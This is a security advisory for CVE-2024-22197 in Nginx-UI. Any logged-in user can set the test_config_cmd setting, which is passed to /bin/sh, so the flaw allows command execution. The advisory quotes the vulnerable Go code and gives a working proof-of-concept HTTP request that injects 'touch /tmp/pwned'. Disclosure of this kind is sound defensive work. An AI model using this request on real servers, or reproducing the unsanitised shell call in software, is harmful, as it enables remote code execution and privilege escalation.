# Authenticated (user role) remote command execution by modifying `nginx` settings (GHSL-2023-269)

**GHSA**: GHSA-pxmr-q2x3-9x9m | **CVE**: CVE-2024-22197 | **Severity**: high (CVSS 7.7)

**CWE**: CWE-77

**Affected Packages**:
- **github.com/0xJacky/Nginx-UI** (go): < 2.0.0.beta.9

## Description

### Summary
The `Home > Preference` page exposes a small list of nginx settings such as `Nginx Access Log Path` and `Nginx Error Log Path`. However, the API also exposes `test_config_cmd`, `reload_cmd` and `restart_cmd`. While the UI doesn't allow users to modify any of these settings, it is possible to do so by sending a request to the [API](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/router.go#L13).
```go
func InitPrivateRouter(r *gin.RouterGroup) {
    r.GET("settings", GetSettings)
    r.POST("settings", SaveSettings)
    ...
}
```
The [`SaveSettings`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/system/settings.go#L18) function is used to save the settings. It is protected by the [`authRequired`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/router/middleware.go#L45) middleware, which requires a valid JWT token or a `X-Node-Secret` which must equal the `Node Secret` configuration value. However, given the lack of authorization roles, any authenticated user can modify the settings.
The `SaveSettings` function is defined as follows:
```go
func SaveSettings(c *gin.Context) {
    var json struct {
        ...
        Nginx  settings.Nginx  `json:"nginx"`
        ...
    }

    ...

    settings.NginxSettings = json.Nginx

    ...

    err := settings.Save()
    ...
}
```
The `test_config_cmd` setting is stored as [`settings.NginxSettings.TestConfigCmd`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/settings/nginx.go#L8). When the application wants to test the nginx configuration, it uses the [`TestConf`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/nginx/nginx.go#L26) function:
```go
func TestConf() (out string) {
	if settings.NginxSettings.TestConfigCmd != "" {
		out = execShell(settings.NginxSettings.TestConfigCmd)

		return
	}

	out = execCommand("nginx", "-t")

	return
}
```
The [`execShell`](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/internal/nginx/nginx.go#L8) function is defined as follows:
```go
func execShell(cmd string) (out string) {
	bytes, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	out = string(bytes)
	if err != nil {
		out += " " + err.Error()
	}
	return
}
```
Where the `cmd` argument is user-controlled and is passed to `/bin/sh -c`.
This issue was found using CodeQL for Go: [Command built from user-controlled sources](https://codeql.github.com/codeql-query-help/go/go-command-injection/).

#### Proof of Concept
> Based on [this setup](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/README.md?plain=1#L210) using `uozi/nginx-ui:v2.0.0-beta.7`.
1. Login as a newly created user.
2. Send the following request to modify the settings with `"test_config_cmd":"touch /tmp/pwned"`.
```http
POST /api/settings HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 528
Authorization: <<JWT TOKEN>
Content-Type: application/json

{"nginx":{"access_log_path":"","error_log_path":"","config_dir":"","pid_path":"","test_config_cmd":"touch /tmp/pwned","reload_cmd":"","restart_cmd":""},"openai":{"base_url":"","token":"","proxy":"","model":""},"server":{"http_host":"0.0.0.0","http_port":"9000","run_mode":"debug","jwt_secret":"foo","node_secret":"foo","http_challenge_port":"9180","email":"foo","database":"foo","start_cmd":"","ca_dir":"","demo":false,"page_size":10,"github_proxy":""}}
```
3. Add a new site in `Home > Manage Sites > Add Site` with random data. The previously-modified `test_config_cmd` setting will be used [when the application tries to test the nginx configuration](https://github.com/0xJacky/nginx-ui/blob/04bf8ec487f06ab17a9fb7f34a28766e5f53885e/api/sites/domain.go#L256).
4. Verify that `/tmp/pwned` exists.
```
$ docker exec -it $(docker ps -q) ls -al /tmp
-rw-r--r-- 1 root root    0 Dec 14 21:10 pwned
```

### Impact

This issue may lead to authenticated Remote Code Execution, Privilege Escalation, and Information Disclosure.
